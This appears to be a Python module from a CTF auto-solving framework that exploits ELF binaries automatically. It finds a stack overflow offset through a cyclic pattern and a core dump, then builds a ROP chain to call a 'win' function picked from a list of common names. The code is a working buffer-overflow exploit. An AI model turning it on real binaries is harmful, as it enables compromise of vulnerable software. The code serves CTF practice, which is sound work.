"""
Automatic ret2win exploitation.

This unit detects ELF binaries with a buffer overflow vulnerability
and a "win" function (common names: win, flag, shell, get_flag, print_flag,
ret2win, give_shell). It automatically builds a ROP chain to call the
win function.

Ported from autorop's Custom call pipeline.
"""

import os
import stat
from typing import Any, Generator

from flagr.unit import NotApplicable
from flagr.units.pwn import PwnUnit


# Common win function names in CTF challenges
WIN_FUNCTIONS = [
    "win", "flag", "shell", "get_flag", "print_flag",
    "ret2win", "give_shell", "system", "secret", "backdoor",
    "read_flag", "cat_flag", "spawn_shell", "getFlag",
    "printFlag", "open_shell", "vuln",
]


class Unit(PwnUnit):

    GROUPS = ["pwn", "elf", "ret2win", "exploit"]
    PRIORITY = 20
    RECURSE_SELF = False

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        try:
            from pwn import ELF
            self._elf = ELF(self.target.path, checksec=False)
        except Exception:
            raise NotApplicable("could not parse ELF")

        if self._elf.pie:
            raise NotApplicable("PIE binary")

        # Find win functions
        self._win_funcs = []
        for name in WIN_FUNCTIONS:
            if name in self._elf.symbols:
                self._win_funcs.append(name)

        if not self._win_funcs:
            raise NotApplicable("no win function found")

    def enumerate(self) -> Generator[Any, None, None]:
        """Yield each potential win function to try."""
        for func_name in self._win_funcs:
            yield func_name

    def evaluate(self, case: Any):
        """
        Attempt ret2win exploitation by:
        1. Finding buffer overflow offset via corefile
        2. Building ROP chain to call the win function
        3. Running the exploit and capturing output
        """
        func_name = case
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import process, cyclic, cyclic_find, context, ROP, Coredump

        context.binary = self._elf
        context.log_level = "error"

        st = os.stat(self.target.path)
        os.chmod(self.target.path, st.st_mode | stat.S_IEXEC)

        try:
            # Step 1: Find offset via corefile
            p = process(self.target.path)
            pattern = cyclic(1024, n=context.bytes)
            p.sendline(pattern)
            p.wait(timeout=5)

            core = Coredump(p.corefile.path)
            offset = cyclic_find(core.fault_addr, n=context.bytes)
            p.close()

            if not offset or offset <= 0 or offset >= 10000:
                return

            # Step 2: Build ROP chain
            rop = ROP(self._elf)

            # Add stack alignment ret for x86_64
            if self._elf.bits == 64:
                try:
                    rop.raw(rop.find_gadget(["ret"])[0])
                except (IndexError, TypeError):
                    pass

            rop.call(self._elf.symbols[func_name])

            # Step 3: Build and send payload
            payload = b"A" * offset + rop.chain()

            p = process(self.target.path)
            p.sendline(payload)

            try:
                output = p.recvall(timeout=3)
                if output:
                    self.manager.register_data(self, output)
            except Exception:
                pass
            finally:
                p.close()

        except Exception:
            pass
